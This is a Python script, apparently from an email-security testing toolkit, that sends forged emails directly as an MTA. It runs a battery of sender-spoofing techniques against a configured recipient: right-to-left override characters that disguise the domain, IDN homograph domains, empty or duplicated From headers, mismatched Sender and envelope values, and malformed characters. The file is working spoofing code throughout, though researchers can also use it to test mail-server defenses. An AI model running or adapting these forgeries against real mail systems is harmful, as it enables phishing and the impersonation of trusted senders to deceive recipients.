# -*- coding: UTF-8 -*-
# the code to send forged emails as an MTA

import time
from util.log import init_log
from struct import pack
import random
import os
import string
from core.MTA import *
from config import *

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = BASE_DIR + '/log/mta.log'
logger = init_log(LOG_FILE)


def test_reverse_mime_from(to_email):
    mail_from = ""
    # MIME.From
    mime_from = "\u202emoc.qq@\u202dadmin"
    subject = "{} --> {} [reverse domain]".format(mime_from, to_email)
    content = "{} --> {} [reverse domain]\n".format(mime_from, to_email)
    content += "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_mime_from_empty(mail_from,to_email):
    mime_from = ''
    subject = "%s --> %s [test_mime_empty]" % (mail_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_IDN_mime_from(to_email):
    # Envelope.From
    mail_from = "admin1@xn--80aa1cn6g67a.com"
    # MIME.From
    mime_from = "admin1@xn--80aa1cn6g67a.com"
    subject = "{} --> {} [IDN domain]".format(mime_from, to_email)
    content = "{} --> {} [IDN domain]\n".format(mime_from, to_email)
    content += "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_sender(mail_from,to_email,sender):
    mime_from = mail_from
    # Sender
    subject = "%s --> %s [Sender]" % (mail_from, to_email)
    content = "%s --> %s [Sender]\n" % (mail_from, to_email)
    content += "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    content += "Sender: {}\n".format(sender)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from,sender=sender)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_mail_mime_attack(mail_from,to_email):
    domain = mail_from.split('@')[1]
    mime_from = 'admin@' + domain
    subject = "%s --> %s [test_mail_mime_attack]" % (mail_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_mail_mime_attack_diff_domain(mail_from,to_email):
    username = mail_from.split('@')[0]
    mime_from = username+'@emailtestxxx.com'
    subject = "%s --> %s [test_mail_mime_attack_diff_domain]" % (mime_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_mime_from_badchar(to_email):
    mail_from = "admin@test.com"
    # MIME.From
    mime_from = "admin@test.com{}@test2.com".format('\xff')
    subject = "%s --> %s [badchar]" % (mime_from, to_email)
    content = "%s --> %s [badchar]\n" % (mime_from, to_email)
    content += "Envelope.From: " + str(mail_from)
    content += "\nMIME.From: " + str(mime_from)
    spoof(mail_from,to_email,subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_mail_from_empty(mime_from,to_email,helo):
    mail_from = ''
    subject = "%s --> %s [test_mail_from_empty]" % (mime_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from,to_email,subject, content,helo=helo,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_multiple_value_mime_from1(mail_from,to_email):
    mail_from = mail_from
    domain = mail_from.split('@')[1]
    first_mime_from = 'admin@'+domain
    mime_from = first_mime_from+','+mail_from
    subject = "%s --> %s [test_multiple_value_mime_from_1]" % (mail_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from, to_email, subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_multiple_value_mime_from2(mail_from,to_email):
    mail_from = mail_from
    domain = mail_from.split('@')[1]
    second_mime_from = 'admin@'+domain
    mime_from = mail_from+','+second_mime_from
    subject = "%s --> %s [test_multiple_value_mime_from_2]" % (mail_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    spoof(mail_from, to_email, subject, content,mime_from=mime_from)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_multiple_mime_from1(mail_from,to_email):
    mime_from = mail_from
    domain = mail_from.split('@')[1]
    mime_from1 = 'admin@'+domain
    subject = "%s --> %s [test_multiple_mime_from1]" % (mail_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    content += "mime_from1: {}\n".format(mime_from1)
    spoof(mail_from, to_email, subject, content,mime_from=mime_from,mime_from1=mime_from1)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_multiple_mime_from2(mail_from,to_email):
    mime_from = mail_from
    domain = mail_from.split('@')[1]
    mime_from2 = 'admin@'+domain
    subject = "%s --> %s [test_multiple_mime_from2]" % (mail_from, to_email)
    content = "Envelope.From: {}\n".format(mail_from)
    content += "MIME.From: {}\n".format(mime_from)
    content += "mime_from2: {}\n".format(mime_from2)
    spoof(mail_from, to_email, subject, content,mime_from=mime_from,mime_from2=mime_from2)
    # logger.debug(content)
    # logger.debug('-' * 20)

def test_normal(mail_from, to_email, subject, content, mime_from=None, mime_from1=None,mime_from2=None, sender=None,
          helo=None,filename=None):
    spoof(mail_from, to_email, subject, content, mime_from=mime_from, mime_from1=None,mime_from2=None,filename=filename)
    # logger.debug(content)
    # logger.debug('-' * 20)



if __name__ == "__main__":

    """
    Send normal smtp email to receiverUser
    :param mail_from:
    :param mime_from:
    :param to_email:MTA target which can be changed to what you like.
    :param subject:
    :param content: both html and normal text is supported
    :param filename: put Mail attachment into uploads folder and specify 'filename'
    Other parameters like helo,mime_from1,mime_from2,sender can be specified.
    :return:
    """
    # test_normal(mail_from, to_email, subject, content, mime_from=mime_from, mime_from1=None,mime_from2=None, sender=None,helo=None,filename=None)
    test_reverse_mime_from(to_email)
    test_mime_from_empty(mail_from,to_email)
    test_IDN_mime_from(to_email)

    test_sender(mail_from,to_email,sender)
    test_mail_mime_attack(mail_from,to_email)
    test_mail_mime_attack_diff_domain(mail_from,to_email)
    test_mime_from_badchar(to_email)

    test_mail_from_empty(mime_from,to_email,helo)
    test_multiple_value_mime_from1(mail_from,to_email)
    test_multiple_value_mime_from2(mail_from,to_email)
    test_multiple_mime_from1(mail_from,to_email)
    test_multiple_mime_from2(mail_from,to_email)










 